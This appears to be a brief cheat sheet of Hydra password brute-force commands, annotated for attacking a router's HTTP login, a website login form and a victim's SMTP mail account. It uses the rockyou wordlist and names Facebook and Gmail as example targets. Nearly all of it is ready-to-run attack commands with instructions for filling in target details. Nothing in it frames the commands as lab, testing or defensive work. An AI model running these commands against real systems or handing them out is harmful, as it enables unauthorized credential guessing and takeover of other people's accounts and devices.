 Attack Router :
 ---------------
     * hydra -l admin -P pass.txt 192.168.0.1 http-get -m / -V
		 >> "-l" = username, "-P" = password file then router ip 
         >> "http-get" mean it's a get request.
		 >> pass.txt == Password file
 

 Attack webside :
 ----------------
     * hydra -L user.txt -P pass.txt <server ip> http-post-form "<rest login address>:username=^USER^&password=^PASS^
       &Login=Login:<Error massage>" -V
 
      # <server ip>              = Enter server ip address
      # <rest login address>     = suppose login address is "facebook.com/login".Here "/login" is <rest login address>
      # "username" & "password"  = from username tag get the name field and same for password and also get the url.
      # <Error message>          = Enter error when we enter wrong username or password
      # http-post-form           = This is http post request. We also can spacify "http-get-form"
 

 Attack Mail server:
 -------------------
     * hydra smtp.victimsemailserver.com smtp -l victimsaccountname -P ‘/root/Desktop/rockyou.txt’ -s portnumber -S -v -V
		>> The SMTP server (For example, smtp.gmail.com if the victim is a Gmail user) 
		>> -s 465 Port 465 stands for SMTPS which is SSL encryption that is started automatically.
		>> -S = SSL encript
